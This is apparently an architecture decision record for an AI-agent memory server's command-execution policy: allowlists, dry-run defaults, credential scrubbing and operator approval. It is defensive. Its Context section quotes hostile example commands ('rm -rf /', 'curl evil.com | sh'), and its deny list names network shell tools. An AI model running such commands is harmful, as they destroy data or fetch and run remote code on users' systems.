# ADR-006: Command Execution Policy — Strict Allowlist, Sandboxing, and Dry-Run by Default

**Status:** Accepted  
**Date:** 2026-09-10  
**Deciders:** Project team  

---

## Context

The `verify_fix` tool allows an AI agent to re-execute a failed command or run a proposed remediation command to test whether a fix succeeded.

Direct execution of commands proposed by or retrieved from an automated memory store poses severe security hazards:
- Command injection (`rm -rf /`, `curl evil.com | sh`, arbitrary binary execution)
- Privilege escalation or lateral movement
- Accidental destructive operations (`git reset --hard`, `npm publish`)
- Execution outside the repository boundary

## Decision

We enforce a strict four-layer defense-in-depth policy on all command executions in `CoMemor`:

### 1. Default to Dry-Run Mode
- By default, all calls to `verify_fix` operate in `dryRun: true` mode.
- In dry-run mode, the server parses the command, checks policies, and returns what *would* be executed without spawning any subprocess.
- Live execution (`dryRun: false`) is rejected unless explicit approval criteria are met.

### 2. Strict Command Allowlist & Disallowlist
Only explicitly recognized test, build, and package commands are allowed:
- Allowed commands: `npm test`, `npm run build`, `npm run check`, `npx vitest`, `npx tsc`, `pnpm test`, `yarn test`, `cargo test`, `pytest`, `go test`.
- Disallowed / Prohibited operations:
  - Shell metacharacters and chaining: `;`, `&`, `&&`, `|`, `||`, `>`, `<`, `$(...)`, `` `...` ``.
  - Interactive commands (e.g. `vim`, `nano`, `sudo`, `su`).
  - Network transport commands (`curl`, `wget`, `ssh`, `scp`, `nc`).
  - Package installation scripts that can run postinstall hooks without sandbox review.

### 3. Execution Containment & Workspace Boundaries
- Working directory (`cwd`) must be strictly inside the configured repository workspace root.
- Path traversal outside workspace (`../`) is prohibited.
- Execution environment variables are scrubbed; only minimal system PATH and safe Node environment variables are inherited. Sensitive credentials (`GITHUB_TOKEN`, `AWS_*`, `NPM_TOKEN`) are explicitly wiped from child process environments.

### 4. No Server-Side Execution — Proposal-Only Mode

**Server-side command execution has been permanently removed from CoMemor.**

- `verify_fix` performs policy assessment only: it validates the proposed command against the allowlist and safety rules, then returns a structured proposal with `requiresHostConfirmation: true` and `executedByServer: false`.
- When `dryRun: false` is passed, CoMemor logs the proposal to `.agent-memory/approvals-pending.jsonl` for operator audit trail and returns `status: pending_approval` with an `approvalId`.
- The entry in `approvals-resolved.jsonl` written by the operator dashboard is an **audit record only**. It does not trigger execution and is not read back by CoMemor as an execution signal.
- **Actual execution must be initiated by the host agent or IDE** using its own native user-confirmation flow, after the operator has reviewed the proposed command.

## Consequences

- **Positive:** Eliminates arbitrary remote code execution (RCE) via memory retrieval or compromised MCP tool inputs.
- **Positive:** Enforces human-in-the-loop oversight for all state-changing commands.
- **Positive:** No execution surface within the MCP server process — reduces attack surface to zero for command injection.
- **Negative:** Agents cannot autonomously apply fixes without the user manually running the proposed command in the host IDE or agent.

## Status Update (Phase 1 Hardening)

Server-side command execution was removed entirely in the Phase 1 security hardening (v1.0.5). The `verifyFix` method now returns a policy assessment and structured proposal. The `hasResolvedApproval` helper remains for audit log inspection but does not gate any execution path.
